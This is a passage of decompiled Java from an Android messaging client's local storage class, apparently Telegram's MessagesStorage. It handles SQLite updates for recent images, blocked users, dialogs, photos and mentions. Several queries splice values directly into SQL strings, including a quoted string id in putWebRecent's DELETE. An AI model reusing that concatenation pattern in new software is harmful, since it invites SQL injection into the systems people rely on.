        });
    }

    public void addRecentLocalFile(final String imageUrl, final String localUrl, final TLRPC$Document document) {
        if (imageUrl != null && imageUrl.length() != 0) {
            if ((localUrl != null && localUrl.length() != 0) || document != null) {
                this.storageQueue.postRunnable(new Runnable() {
                    public void run() {
                        try {
                            SQLitePreparedStatement state;
                            if (document != null) {
                                state = MessagesStorage.this.database.executeFast("UPDATE web_recent_v3 SET document = ? WHERE image_url = ?");
                                state.requery();
                                NativeByteBuffer data = new NativeByteBuffer(document.getObjectSize());
                                document.serializeToStream(data);
                                state.bindByteBuffer(1, data);
                                state.bindString(2, imageUrl);
                                state.step();
                                state.dispose();
                                data.reuse();
                                return;
                            }
                            state = MessagesStorage.this.database.executeFast("UPDATE web_recent_v3 SET local_url = ? WHERE image_url = ?");
                            state.requery();
                            state.bindString(1, localUrl);
                            state.bindString(2, imageUrl);
                            state.step();
                            state.dispose();
                        } catch (Exception e) {
                            FileLog.e(e);
                        }
                    }
                });
            }
        }
    }

    public void clearWebRecent(final int type) {
        this.storageQueue.postRunnable(new Runnable() {
            public void run() {
                try {
                    MessagesStorage.this.database.executeFast("DELETE FROM web_recent_v3 WHERE type = " + type).stepThis().dispose();
                } catch (Exception e) {
                    FileLog.e(e);
                }
            }
        });
    }

    public void putWebRecent(final ArrayList<MediaController$SearchImage> arrayList) {
        this.storageQueue.postRunnable(new Runnable() {
            public void run() {
                try {
                    MessagesStorage.this.database.beginTransaction();
                    SQLitePreparedStatement state = MessagesStorage.this.database.executeFast("REPLACE INTO web_recent_v3 VALUES(?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
                    int a = 0;
                    while (a < arrayList.size() && a != 200) {
                        MediaController$SearchImage searchImage = (MediaController$SearchImage) arrayList.get(a);
                        state.requery();
                        state.bindString(1, searchImage.id);
                        state.bindInteger(2, searchImage.type);
                        state.bindString(3, searchImage.imageUrl != null ? searchImage.imageUrl : "");
                        state.bindString(4, searchImage.thumbUrl != null ? searchImage.thumbUrl : "");
                        state.bindString(5, searchImage.localUrl != null ? searchImage.localUrl : "");
                        state.bindInteger(6, searchImage.width);
                        state.bindInteger(7, searchImage.height);
                        state.bindInteger(8, searchImage.size);
                        state.bindInteger(9, searchImage.date);
                        NativeByteBuffer data = null;
                        if (searchImage.document != null) {
                            data = new NativeByteBuffer(searchImage.document.getObjectSize());
                            searchImage.document.serializeToStream(data);
                            state.bindByteBuffer(10, data);
                        } else {
                            state.bindNull(10);
                        }
                        state.step();
                        if (data != null) {
                            data.reuse();
                        }
                        a++;
                    }
                    state.dispose();
                    MessagesStorage.this.database.commitTransaction();
                    if (arrayList.size() >= 200) {
                        MessagesStorage.this.database.beginTransaction();
                        for (a = 200; a < arrayList.size(); a++) {
                            MessagesStorage.this.database.executeFast("DELETE FROM web_recent_v3 WHERE id = '" + ((MediaController$SearchImage) arrayList.get(a)).id + "'").stepThis().dispose();
                        }
                        MessagesStorage.this.database.commitTransaction();
                    }
                } catch (Exception e) {
                    FileLog.e(e);
                }
            }
        });
    }

    public void getWallpapers() {
        this.storageQueue.postRunnable(new Runnable() {
            public void run() {
                try {
                    SQLiteCursor cursor = MessagesStorage.this.database.queryFinalized("SELECT data FROM wallpapers WHERE 1", new Object[0]);
                    final ArrayList<TLRPC$WallPaper> wallPapers = new ArrayList();
                    while (cursor.next()) {
                        NativeByteBuffer data = cursor.byteBufferValue(0);
                        if (data != null) {
                            TLRPC$WallPaper wallPaper = TLRPC$WallPaper.TLdeserialize(data, data.readInt32(false), false);
                            data.reuse();
                            wallPapers.add(wallPaper);
                        }
                    }
                    cursor.dispose();
                    AndroidUtilities.runOnUIThread(new Runnable() {
                        public void run() {
                            NotificationCenter.getInstance().postNotificationName(NotificationCenter.wallpapersDidLoaded, new Object[]{wallPapers});
                        }
                    });
                } catch (Exception e) {
                    FileLog.e(e);
                }
            }
        });
    }

    public void getBlockedUsers() {
        this.storageQueue.postRunnable(new Runnable() {
            public void run() {
                try {
                    ArrayList<Integer> ids = new ArrayList();
                    ArrayList<User> users = new ArrayList();
                    SQLiteCursor cursor = MessagesStorage.this.database.queryFinalized("SELECT * FROM blocked_users WHERE 1", new Object[0]);
                    StringBuilder usersToLoad = new StringBuilder();
                    while (cursor.next()) {
                        int user_id = cursor.intValue(0);
                        ids.add(Integer.valueOf(user_id));
                        if (usersToLoad.length() != 0) {
                            usersToLoad.append(",");
                        }
                        usersToLoad.append(user_id);
                    }
                    cursor.dispose();
                    if (usersToLoad.length() != 0) {
                        MessagesStorage.this.getUsersInternal(usersToLoad.toString(), users);
                    }
                    MessagesController.getInstance().processLoadedBlockedUsers(ids, users, true);
                } catch (Exception e) {
                    FileLog.e(e);
                }
            }
        });
    }

    public void deleteBlockedUser(final int id) {
        this.storageQueue.postRunnable(new Runnable() {
            public void run() {
                try {
                    MessagesStorage.this.database.executeFast("DELETE FROM blocked_users WHERE uid = " + id).stepThis().dispose();
                } catch (Exception e) {
                    FileLog.e(e);
                }
            }
        });
    }

    public void putBlockedUsers(final ArrayList<Integer> ids, final boolean replace) {
        if (ids != null && !ids.isEmpty()) {
            this.storageQueue.postRunnable(new Runnable() {
                public void run() {
                    try {
                        if (replace) {
                            MessagesStorage.this.database.executeFast("DELETE FROM blocked_users WHERE 1").stepThis().dispose();
                        }
                        MessagesStorage.this.database.beginTransaction();
                        SQLitePreparedStatement state = MessagesStorage.this.database.executeFast("REPLACE INTO blocked_users VALUES(?)");
                        Iterator it = ids.iterator();
                        while (it.hasNext()) {
                            Integer id = (Integer) it.next();
                            state.requery();
                            state.bindInteger(1, id.intValue());
                            state.step();
                        }
                        state.dispose();
                        MessagesStorage.this.database.commitTransaction();
                    } catch (Exception e) {
                        FileLog.e(e);
                    }
                }
            });
        }
    }

    public void deleteUserChannelHistory(final int channelId, final int uid) {
        this.storageQueue.postRunnable(new Runnable() {
            public void run() {
                try {
                    long did = (long) (-channelId);
                    final ArrayList<Integer> mids = new ArrayList();
                    SQLiteCursor cursor = MessagesStorage.this.database.queryFinalized("SELECT data FROM messages WHERE uid = " + did, new Object[0]);
                    ArrayList<File> filesToDelete = new ArrayList();
                    while (cursor.next()) {
                        NativeByteBuffer data = cursor.byteBufferValue(0);
                        if (data != null) {
                            TLRPC$Message message = TLRPC$Message.TLdeserialize(data, data.readInt32(false), false);
                            data.reuse();
                            if (!(message == null || message.from_id != uid || message.id == 1)) {
                                mids.add(Integer.valueOf(message.id));
                                File file;
                                if (message.media instanceof TLRPC$TL_messageMediaPhoto) {
                                    Iterator it = message.media.photo.sizes.iterator();
                                    while (it.hasNext()) {
                                        file = FileLoader.getPathToAttach((TLRPC$PhotoSize) it.next());
                                        if (file != null && file.toString().length() > 0) {
                                            filesToDelete.add(file);
                                        }
                                    }
                                } else {
                                    try {
                                        if (message.media instanceof TLRPC$TL_messageMediaDocument) {
                                            file = FileLoader.getPathToAttach(message.media.document);
                                            if (file != null && file.toString().length() > 0) {
                                                filesToDelete.add(file);
                                            }
                                            file = FileLoader.getPathToAttach(message.media.document.thumb);
                                            if (file != null && file.toString().length() > 0) {
                                                filesToDelete.add(file);
                                            }
                                        }
                                    } catch (Exception e) {
                                        FileLog.e(e);
                                    }
                                }
                            }
                        }
                    }
                    cursor.dispose();
                    AndroidUtilities.runOnUIThread(new Runnable() {
                        public void run() {
                            MessagesController.getInstance().markChannelDialogMessageAsDeleted(mids, channelId);
                        }
                    });
                    MessagesStorage.this.markMessagesAsDeletedInternal((ArrayList) mids, channelId);
                    MessagesStorage.this.updateDialogsWithDeletedMessagesInternal(mids, null, channelId);
                    FileLoader.getInstance().deleteFiles(filesToDelete, 0);
                    if (!mids.isEmpty()) {
                        AndroidUtilities.runOnUIThread(new Runnable() {
                            public void run() {
                                NotificationCenter.getInstance().postNotificationName(NotificationCenter.messagesDeleted, new Object[]{mids, Integer.valueOf(channelId)});
                            }
                        });
                    }
                } catch (Exception e2) {
                    FileLog.e(e2);
                }
            }
        });
    }

    public void deleteDialog(final long did, final int messagesOnly) {
        this.storageQueue.postRunnable(new Runnable() {

            /* renamed from: org.telegram.messenger.MessagesStorage$22$1 */
            class C15331 implements Runnable {
                C15331() {
                }

                public void run() {
                    NotificationCenter.getInstance().postNotificationName(NotificationCenter.needReloadRecentDialogsSearch, new Object[0]);
                }
            }

            public void run() {
                try {
                    SQLiteCursor cursor;
                    NativeByteBuffer data;
                    TLRPC$Message message;
                    if (messagesOnly == 3) {
                        int lastMid = -1;
                        cursor = MessagesStorage.this.database.queryFinalized("SELECT last_mid FROM dialogs WHERE did = " + did, new Object[0]);
                        if (cursor.next()) {
                            lastMid = cursor.intValue(0);
                        }
                        cursor.dispose();
                        if (lastMid != 0) {
                            return;
                        }
                    }
                    if (((int) did) == 0 || messagesOnly == 2) {
                        cursor = MessagesStorage.this.database.queryFinalized("SELECT data FROM messages WHERE uid = " + did, new Object[0]);
                        ArrayList<File> filesToDelete = new ArrayList();
                        while (cursor.next()) {
                            try {
                                data = cursor.byteBufferValue(0);
                                if (data != null) {
                                    message = TLRPC$Message.TLdeserialize(data, data.readInt32(false), false);
                                    data.reuse();
                                    if (!(message == null || message.media == null)) {
                                        File file;
                                        if (message.media instanceof TLRPC$TL_messageMediaPhoto) {
                                            Iterator it = message.media.photo.sizes.iterator();
                                            while (it.hasNext()) {
                                                file = FileLoader.getPathToAttach((TLRPC$PhotoSize) it.next());
                                                if (file != null && file.toString().length() > 0) {
                                                    filesToDelete.add(file);
                                                }
                                            }
                                        } else if (message.media instanceof TLRPC$TL_messageMediaDocument) {
                                            file = FileLoader.getPathToAttach(message.media.document);
                                            if (file != null && file.toString().length() > 0) {
                                                filesToDelete.add(file);
                                            }
                                            file = FileLoader.getPathToAttach(message.media.document.thumb);
                                            if (file != null && file.toString().length() > 0) {
                                                filesToDelete.add(file);
                                            }
                                        }
                                    }
                                }
                            } catch (Exception e) {
                                FileLog.e(e);
                            }
                        }
                        cursor.dispose();
                        FileLoader.getInstance().deleteFiles(filesToDelete, messagesOnly);
                    }
                    if (messagesOnly == 0 || messagesOnly == 3) {
                        MessagesStorage.this.database.executeFast("DELETE FROM dialogs WHERE did = " + did).stepThis().dispose();
                        MessagesStorage.this.database.executeFast("DELETE FROM chat_settings_v2 WHERE uid = " + did).stepThis().dispose();
                        MessagesStorage.this.database.executeFast("DELETE FROM chat_pinned WHERE uid = " + did).stepThis().dispose();
                        MessagesStorage.this.database.executeFast("DELETE FROM channel_users_v2 WHERE did = " + did).stepThis().dispose();
                        MessagesStorage.this.database.executeFast("DELETE FROM search_recent WHERE did = " + did).stepThis().dispose();
                        int lower_id = (int) did;
                        int high_id = (int) (did >> 32);
                        if (lower_id == 0) {
                            MessagesStorage.this.database.executeFast("DELETE FROM enc_chats WHERE uid = " + high_id).stepThis().dispose();
                        } else if (high_id == 1) {
                            MessagesStorage.this.database.executeFast("DELETE FROM chats WHERE uid = " + lower_id).stepThis().dispose();
                        } else if (lower_id < 0) {
                        }
                    } else if (messagesOnly == 2) {
                        cursor = MessagesStorage.this.database.queryFinalized("SELECT last_mid_i, last_mid FROM dialogs WHERE did = " + did, new Object[0]);
                        int messageId = -1;
                        if (cursor.next()) {
                            long last_mid_i = cursor.longValue(0);
                            long last_mid = cursor.longValue(1);
                            SQLiteCursor cursor2 = MessagesStorage.this.database.queryFinalized("SELECT data FROM messages WHERE uid = " + did + " AND mid IN (" + last_mid_i + "," + last_mid + ")", new Object[0]);
                            while (cursor2.next()) {
                                try {
                                    data = cursor2.byteBufferValue(0);
                                    if (data != null) {
                                        message = TLRPC$Message.TLdeserialize(data, data.readInt32(false), false);
                                        data.reuse();
                                        if (message != null) {
                                            messageId = message.id;
                                        }
                                    }
                                } catch (Exception e2) {
                                    FileLog.e(e2);
                                }
                            }
                            cursor2.dispose();
                            MessagesStorage.this.database.executeFast("DELETE FROM messages WHERE uid = " + did + " AND mid != " + last_mid_i + " AND mid != " + last_mid).stepThis().dispose();
                            MessagesStorage.this.database.executeFast("DELETE FROM messages_holes WHERE uid = " + did).stepThis().dispose();
                            MessagesStorage.this.database.executeFast("DELETE FROM bot_keyboard WHERE uid = " + did).stepThis().dispose();
                            MessagesStorage.this.database.executeFast("DELETE FROM media_counts_v2 WHERE uid = " + did).stepThis().dispose();
                            MessagesStorage.this.database.executeFast("DELETE FROM media_v2 WHERE uid = " + did).stepThis().dispose();
                            MessagesStorage.this.database.executeFast("DELETE FROM media_holes_v2 WHERE uid = " + did).stepThis().dispose();
                            BotQuery.clearBotKeyboard(did, null);
                            SQLitePreparedStatement state5 = MessagesStorage.this.database.executeFast("REPLACE INTO messages_holes VALUES(?, ?, ?)");
                            SQLitePreparedStatement state6 = MessagesStorage.this.database.executeFast("REPLACE INTO media_holes_v2 VALUES(?, ?, ?, ?)");
                            if (messageId != -1) {
                                MessagesStorage.createFirstHoles(did, state5, state6, messageId);
                            }
                            state5.dispose();
                            state6.dispose();
                        }
                        cursor.dispose();
                        return;
                    }
                    MessagesStorage.this.database.executeFast("UPDATE dialogs SET unread_count = 0 WHERE did = " + did).stepThis().dispose();
                    MessagesStorage.this.database.executeFast("DELETE FROM messages WHERE uid = " + did).stepThis().dispose();
                    MessagesStorage.this.database.executeFast("DELETE FROM bot_keyboard WHERE uid = " + did).stepThis().dispose();
                    MessagesStorage.this.database.executeFast("DELETE FROM media_counts_v2 WHERE uid = " + did).stepThis().dispose();
                    MessagesStorage.this.database.executeFast("DELETE FROM media_v2 WHERE uid = " + did).stepThis().dispose();
                    MessagesStorage.this.database.executeFast("DELETE FROM messages_holes WHERE uid = " + did).stepThis().dispose();
                    MessagesStorage.this.database.executeFast("DELETE FROM media_holes_v2 WHERE uid = " + did).stepThis().dispose();
                    BotQuery.clearBotKeyboard(did, null);
                    AndroidUtilities.runOnUIThread(new C15331());
                } catch (Exception e22) {
                    FileLog.e(e22);
                }
            }
        });
    }

    public void getDialogPhotos(int did, int count, long max_id, int classGuid) {
        final long j = max_id;
        final int i = did;
        final int i2 = count;
        final int i3 = classGuid;
        this.storageQueue.postRunnable(new Runnable() {
            public void run() {
                try {
                    SQLiteCursor cursor;
                    if (j != 0) {
                        cursor = MessagesStorage.this.database.queryFinalized(String.format(Locale.US, "SELECT data FROM user_photos WHERE uid = %d AND id < %d ORDER BY id DESC LIMIT %d", new Object[]{Integer.valueOf(i), Long.valueOf(j), Integer.valueOf(i2)}), new Object[0]);
                    } else {
                        cursor = MessagesStorage.this.database.queryFinalized(String.format(Locale.US, "SELECT data FROM user_photos WHERE uid = %d ORDER BY id DESC LIMIT %d", new Object[]{Integer.valueOf(i), Integer.valueOf(i2)}), new Object[0]);
                    }
                    final TLRPC$photos_Photos res = new TLRPC$TL_photos_photos();
                    while (cursor.next()) {
                        NativeByteBuffer data = cursor.byteBufferValue(0);
                        if (data != null) {
                            TLRPC$Photo photo = TLRPC$Photo.TLdeserialize(data, data.readInt32(false), false);
                            data.reuse();
                            res.photos.add(photo);
                        }
                    }
                    cursor.dispose();
                    Utilities.stageQueue.postRunnable(new Runnable() {
                        public void run() {
                            MessagesController.getInstance().processLoadedUserPhotos(res, i, i2, j, true, i3);
                        }
                    });
                } catch (Exception e) {
                    FileLog.e(e);
                }
            }
        });
    }

    public void clearUserPhotos(final int uid) {
        this.storageQueue.postRunnable(new Runnable() {
            public void run() {
                try {
                    MessagesStorage.this.database.executeFast("DELETE FROM user_photos WHERE uid = " + uid).stepThis().dispose();
                } catch (Exception e) {
                    FileLog.e(e);
                }
            }
        });
    }

    public void clearUserPhoto(final int uid, final long pid) {
        this.storageQueue.postRunnable(new Runnable() {
            public void run() {
                try {
                    MessagesStorage.this.database.executeFast("DELETE FROM user_photos WHERE uid = " + uid + " AND id = " + pid).stepThis().dispose();
                } catch (Exception e) {
                    FileLog.e(e);
                }
            }
        });
    }

    public void resetDialogs(TLRPC$messages_Dialogs dialogsRes, int messagesCount, int seq, int newPts, int date, int qts, HashMap<Long, TLRPC$TL_dialog> new_dialogs_dict, HashMap<Long, MessageObject> new_dialogMessage, TLRPC$Message lastMessage, int dialogsCount) {
        final TLRPC$messages_Dialogs tLRPC$messages_Dialogs = dialogsRes;
        final int i = dialogsCount;
        final int i2 = seq;
        final int i3 = newPts;
        final int i4 = date;
        final int i5 = qts;
        final TLRPC$Message tLRPC$Message = lastMessage;
        final int i6 = messagesCount;
        final HashMap<Long, TLRPC$TL_dialog> hashMap = new_dialogs_dict;
        final HashMap<Long, MessageObject> hashMap2 = new_dialogMessage;
        this.storageQueue.postRunnable(new Runnable() {
            public void run() {
                int maxPinnedNum = 0;
                try {
                    int a;
                    ArrayList<Integer> dids = new ArrayList();
                    int totalPinnedCount = tLRPC$messages_Dialogs.dialogs.size() - i;
                    HashMap<Long, Integer> oldPinnedDialogNums = new HashMap();
                    ArrayList<Long> oldPinnedOrder = new ArrayList();
                    ArrayList<Long> orderArrayList = new ArrayList();
                    for (a = i; a < tLRPC$messages_Dialogs.dialogs.size(); a++) {
                        orderArrayList.add(Long.valueOf(((TLRPC$TL_dialog) tLRPC$messages_Dialogs.dialogs.get(a)).id));
                    }
                    SQLiteCursor cursor = MessagesStorage.this.database.queryFinalized("SELECT did, pinned FROM dialogs WHERE 1", new Object[0]);
                    while (cursor.next()) {
                        long did = cursor.longValue(0);
                        int pinnedNum = cursor.intValue(1);
                        int lower_id = (int) did;
                        if (lower_id != 0) {
                            dids.add(Integer.valueOf(lower_id));
                            if (pinnedNum > 0) {
                                maxPinnedNum = Math.max(pinnedNum, maxPinnedNum);
                                oldPinnedDialogNums.put(Long.valueOf(did), Integer.valueOf(pinnedNum));
                                oldPinnedOrder.add(Long.valueOf(did));
                            }
                        }
                    }
                    final HashMap<Long, Integer> hashMap = oldPinnedDialogNums;
                    Collections.sort(oldPinnedOrder, new Comparator<Long>() {
                        public int compare(Long o1, Long o2) {
                            Integer val1 = (Integer) hashMap.get(o1);
                            Integer val2 = (Integer) hashMap.get(o2);
                            if (val1.intValue() < val2.intValue()) {
                                return 1;
                            }
                            if (val1.intValue() > val2.intValue()) {
                                return -1;
                            }
                            return 0;
                        }
                    });
                    while (oldPinnedOrder.size() < totalPinnedCount) {
                        oldPinnedOrder.add(0, Long.valueOf(0));
                    }
                    cursor.dispose();
                    String ids = "(" + TextUtils.join(",", dids) + ")";
                    MessagesStorage.this.database.beginTransaction();
                    MessagesStorage.this.database.executeFast("DELETE FROM dialogs WHERE did IN " + ids).stepThis().dispose();
                    MessagesStorage.this.database.executeFast("DELETE FROM messages WHERE uid IN " + ids).stepThis().dispose();
                    MessagesStorage.this.database.executeFast("DELETE FROM bot_keyboard WHERE uid IN " + ids).stepThis().dispose();
                    MessagesStorage.this.database.executeFast("DELETE FROM media_counts_v2 WHERE uid IN " + ids).stepThis().dispose();
                    MessagesStorage.this.database.executeFast("DELETE FROM media_v2 WHERE uid IN " + ids).stepThis().dispose();
                    MessagesStorage.this.database.executeFast("DELETE FROM messages_holes WHERE uid IN " + ids).stepThis().dispose();
                    MessagesStorage.this.database.executeFast("DELETE FROM media_holes_v2 WHERE uid IN " + ids).stepThis().dispose();
                    MessagesStorage.this.database.commitTransaction();
                    for (a = 0; a < totalPinnedCount; a++) {
                        TLRPC$TL_dialog dialog = (TLRPC$TL_dialog) tLRPC$messages_Dialogs.dialogs.get(i + a);
                        int oldIdx = oldPinnedOrder.indexOf(Long.valueOf(dialog.id));
                        int newIdx = orderArrayList.indexOf(Long.valueOf(dialog.id));
                        if (!(oldIdx == -1 || newIdx == -1)) {
                            Integer oldNum;
                            if (oldIdx == newIdx) {
                                oldNum = (Integer) oldPinnedDialogNums.get(Long.valueOf(dialog.id));
                                if (oldNum != null) {
                                    dialog.pinnedNum = oldNum.intValue();
                                }
                            } else {
                                oldNum = (Integer) oldPinnedDialogNums.get(Long.valueOf(((Long) oldPinnedOrder.get(newIdx)).longValue()));
                                if (oldNum != null) {
                                    dialog.pinnedNum = oldNum.intValue();
                                }
                            }
                        }
                        if (dialog.pinnedNum == 0) {
                            dialog.pinnedNum = (totalPinnedCount - a) + maxPinnedNum;
                        }
                    }
                    MessagesStorage.this.putDialogsInternal(tLRPC$messages_Dialogs, false);
                    MessagesStorage.this.saveDiffParamsInternal(i2, i3, i4, i5);
                    if (tLRPC$Message == null || tLRPC$Message.id == UserConfig.dialogsLoadOffsetId) {
                        UserConfig.dialogsLoadOffsetId = Integer.MAX_VALUE;
                    } else {
                        UserConfig.totalDialogsLoadCount = tLRPC$messages_Dialogs.dialogs.size();
                        UserConfig.dialogsLoadOffsetId = tLRPC$Message.id;
                        UserConfig.dialogsLoadOffsetDate = tLRPC$Message.date;
                        TLRPC$Chat chat;
                        if (tLRPC$Message.to_id.channel_id != 0) {
                            UserConfig.dialogsLoadOffsetChannelId = tLRPC$Message.to_id.channel_id;
                            UserConfig.dialogsLoadOffsetChatId = 0;
                            UserConfig.dialogsLoadOffsetUserId = 0;
                            for (a = 0; a < tLRPC$messages_Dialogs.chats.size(); a++) {
                                chat = (TLRPC$Chat) tLRPC$messages_Dialogs.chats.get(a);
                                if (chat.id == UserConfig.dialogsLoadOffsetChannelId) {
                                    UserConfig.dialogsLoadOffsetAccess = chat.access_hash;
                                    break;
                                }
                            }
                        } else if (tLRPC$Message.to_id.chat_id != 0) {
                            UserConfig.dialogsLoadOffsetChatId = tLRPC$Message.to_id.chat_id;
                            UserConfig.dialogsLoadOffsetChannelId = 0;
                            UserConfig.dialogsLoadOffsetUserId = 0;
                            for (a = 0; a < tLRPC$messages_Dialogs.chats.size(); a++) {
                                chat = (TLRPC$Chat) tLRPC$messages_Dialogs.chats.get(a);
                                if (chat.id == UserConfig.dialogsLoadOffsetChatId) {
                                    UserConfig.dialogsLoadOffsetAccess = chat.access_hash;
                                    break;
                                }
                            }
                        } else if (tLRPC$Message.to_id.user_id != 0) {
                            UserConfig.dialogsLoadOffsetUserId = tLRPC$Message.to_id.user_id;
                            UserConfig.dialogsLoadOffsetChatId = 0;
                            UserConfig.dialogsLoadOffsetChannelId = 0;
                            for (a = 0; a < tLRPC$messages_Dialogs.users.size(); a++) {
                                User user = (User) tLRPC$messages_Dialogs.users.get(a);
                                if (user.id == UserConfig.dialogsLoadOffsetUserId) {
                                    UserConfig.dialogsLoadOffsetAccess = user.access_hash;
                                    break;
                                }
                            }
                        }
                    }
                    UserConfig.saveConfig(false);
                    MessagesController.getInstance().completeDialogsReset(tLRPC$messages_Dialogs, i6, i2, i3, i4, i5, hashMap, hashMap2, tLRPC$Message);
                } catch (Throwable e) {
                    FileLog.e("tmessages", e);
                }
            }
        });
    }

    public void putDialogPhotos(final int did, final TLRPC$photos_Photos photos) {
        if (photos != null && !photos.photos.isEmpty()) {
            this.storageQueue.postRunnable(new Runnable() {
                public void run() {
                    try {
                        SQLitePreparedStatement state = MessagesStorage.this.database.executeFast("REPLACE INTO user_photos VALUES(?, ?, ?)");
                        Iterator it = photos.photos.iterator();
                        while (it.hasNext()) {
                            TLRPC$Photo photo = (TLRPC$Photo) it.next();
                            if (!(photo instanceof TLRPC$TL_photoEmpty)) {
                                state.requery();
                                NativeByteBuffer data = new NativeByteBuffer(photo.getObjectSize());
                                photo.serializeToStream(data);
                                state.bindInteger(1, did);
                                state.bindLong(2, photo.id);
                                state.bindByteBuffer(3, data);
                                state.step();
                                data.reuse();
                            }
                        }
                        state.dispose();
                    } catch (Exception e) {
                        FileLog.e(e);
                    }
                }
            });
        }
    }

    public void emptyMessagesMedia(final ArrayList<Integer> mids) {
        this.storageQueue.postRunnable(new Runnable() {
            public void run() {
                try {
                    NativeByteBuffer data;
                    TLRPC$Message message;
                    ArrayList<File> filesToDelete = new ArrayList();
                    final ArrayList<TLRPC$Message> messages = new ArrayList();
                    SQLiteCursor cursor = MessagesStorage.this.database.queryFinalized(String.format(Locale.US, "SELECT data, mid, date, uid FROM messages WHERE mid IN (%s)", new Object[]{TextUtils.join(",", mids)}), new Object[0]);
                    while (cursor.next()) {
                        data = cursor.byteBufferValue(0);
                        if (data != null) {
                            message = TLRPC$Message.TLdeserialize(data, data.readInt32(false), false);
                            data.reuse();
                            if (message.media == null) {
                                continue;
                            } else {
                                File file;
                                if (message.media.document != null) {
                                    file = FileLoader.getPathToAttach(message.media.document, true);
                                    if (file != null && file.toString().length() > 0) {
                                        filesToDelete.add(file);
                                    }
                                    file = FileLoader.getPathToAttach(message.media.document.thumb, true);
                                    if (file != null && file.toString().length() > 0) {
                                        filesToDelete.add(file);
                                    }
                                    message.media.document = new TLRPC$TL_documentEmpty();
                                } else if (message.media.photo != null) {
                                    Iterator it = message.media.photo.sizes.iterator();
                                    while (it.hasNext()) {
                                        file = FileLoader.getPathToAttach((TLRPC$PhotoSize) it.next(), true);
                                        if (file != null && file.toString().length() > 0) {
                                            filesToDelete.add(file);
                                        }
                                    }
                                    message.media.photo = new TLRPC$TL_photoEmpty();
                                }
                                message.media.flags &= -2;
                                message.id = cursor.intValue(1);
                                message.date = cursor.intValue(2);
                                message.dialog_id = cursor.longValue(3);
                                messages.add(message);
                            }
                        }
                    }
                    cursor.dispose();
                    if (!messages.isEmpty()) {
                        SQLitePreparedStatement state = MessagesStorage.this.database.executeFast("REPLACE INTO messages VALUES(?, ?, ?, ?, ?, ?, ?, ?, ?, NULL, ?, ?)");
                        for (int a = 0; a < messages.size(); a++) {
                            message = (TLRPC$Message) messages.get(a);
                            data = new NativeByteBuffer(message.getObjectSize());
                            message.serializeToStream(data);
                            state.requery();
                            state.bindLong(1, (long) message.id);
                            state.bindLong(2, message.dialog_id);
                            state.bindInteger(3, MessageObject.getUnreadFlags(message));
                            state.bindInteger(4, message.send_state);
                            state.bindInteger(5, message.date);
                            state.bindByteBuffer(6, data);
                            state.bindInteger(7, MessageObject.isOut(message) ? 1 : 0);
                            state.bindInteger(8, message.ttl);
                            if ((message.flags & 1024) != 0) {
                                state.bindInteger(9, message.views);
                            } else {
                                state.bindInteger(9, MessagesStorage.this.getMessageMediaType(message));
                            }
                            state.bindInteger(10, 0);
                            state.bindInteger(11, message.mentioned ? 1 : 0);
                            state.step();
                            data.reuse();
                        }
                        state.dispose();
                        AndroidUtilities.runOnUIThread(new Runnable() {
                            public void run() {
                                for (int a = 0; a < messages.size(); a++) {
                                    NotificationCenter.getInstance().postNotificationName(NotificationCenter.updateMessageMedia, new Object[]{messages.get(a)});
                                }
                            }
                        });
                    }
                    FileLoader.getInstance().deleteFiles(filesToDelete, 0);
                } catch (Exception e) {
                    FileLog.e(e);
                }
            }
        });
    }

    public void getNewTask(final ArrayList<Integer> oldTask, int channelId) {
        this.storageQueue.postRunnable(new Runnable() {
            public void run() {
                try {
                    if (oldTask != null) {
                        String ids = TextUtils.join(",", oldTask);
                        MessagesStorage.this.database.executeFast(String.format(Locale.US, "DELETE FROM enc_tasks_v2 WHERE mid IN(%s)", new Object[]{ids})).stepThis().dispose();
                    }
                    int date = 0;
                    int channelId = -1;
                    ArrayList<Integer> arr = null;
                    SQLiteCursor cursor = MessagesStorage.this.database.queryFinalized("SELECT mid, date FROM enc_tasks_v2 WHERE date = (SELECT min(date) FROM enc_tasks_v2)", new Object[0]);
                    while (cursor.next()) {
                        long mid = cursor.longValue(0);
                        if (channelId == -1) {
                            channelId = (int) (mid >> 32);
                            if (channelId < 0) {
                                channelId = 0;
                            }
                        }
                        date = cursor.intValue(1);
                        if (arr == null) {
                            arr = new ArrayList();
                        }
                        arr.add(Integer.valueOf((int) mid));
                    }
                    cursor.dispose();
                    MessagesController.getInstance().processLoadedDeleteTask(date, arr, channelId);
                } catch (Exception e) {
                    FileLog.e(e);
                }
            }
        });
    }

    public void markMentionMessageAsRead(int messageId, int channelId, long did) {
        final int i = messageId;
        final int i2 = channelId;
        final long j = did;
        this.storageQueue.postRunnable(new Runnable() {
            public void run() {
                try {
                    long mid = (long) i;
                    if (i2 != 0) {
                        mid |= ((long) i2) << 32;
                    }
                    MessagesStorage.this.database.executeFast(String.format(Locale.US, "UPDATE messages SET read_state = read_state | 2 WHERE mid = %d", new Object[]{Long.valueOf(mid)})).stepThis().dispose();
                    SQLiteCursor cursor = MessagesStorage.this.database.queryFinalized("SELECT unread_count_i FROM dialogs WHERE did = " + j, new Object[0]);
                    int old_mentions_count = 0;
                    if (cursor.next()) {
                        old_mentions_count = Math.max(0, cursor.intValue(0) - 1);
                    }
                    cursor.dispose();
                    MessagesStorage.this.database.executeFast(String.format(Locale.US, "UPDATE dialogs SET unread_count_i = %d WHERE did = %d", new Object[]{Integer.valueOf(old_mentions_count), Long.valueOf(j)})).stepThis().dispose();
                    HashMap<Long, Integer> hashMap = new HashMap();
                    hashMap.put(Long.valueOf(j), Integer.valueOf(old_mentions_count));
                    MessagesController.getInstance().processDialogsUpdateRead(null, hashMap);
                } catch (Exception e) {
                    FileLog.e(e);
                }
            }
        });
    }

    public void markMessageAsMention(final long mid) {
        this.storageQueue.postRunnable(new Runnable() {
            public void run() {
                try {
                    MessagesStorage.this.database.executeFast(String.format(Locale.US, "UPDATE messages SET mention = 1, read_state = read_state & ~2 WHERE mid = %d", new Object[]{Long.valueOf(mid)})).stepThis().dispose();
                } catch (Exception e) {
                    FileLog.e(e);
                }
            }
        });
    }

    public void resetMentionsCount(final long did, final int count) {
        this.storageQueue.postRunnable(new Runnable() {
            public void run() {
                try {
                    if (count == 0) {
                        MessagesStorage.this.database.executeFast(String.format(Locale.US, "UPDATE messages SET read_state = read_state | 2 WHERE uid = %d AND mention = 1 AND read_state IN(0, 1)", new Object[]{Long.valueOf(did)})).stepThis().dispose();
                    }
                    MessagesStorage.this.database.executeFast(String.format(Locale.US, "UPDATE dialogs SET unread_count_i = %d WHERE did = %d", new Object[]{Integer.valueOf(count), Long.valueOf(did)})).stepThis().dispose();
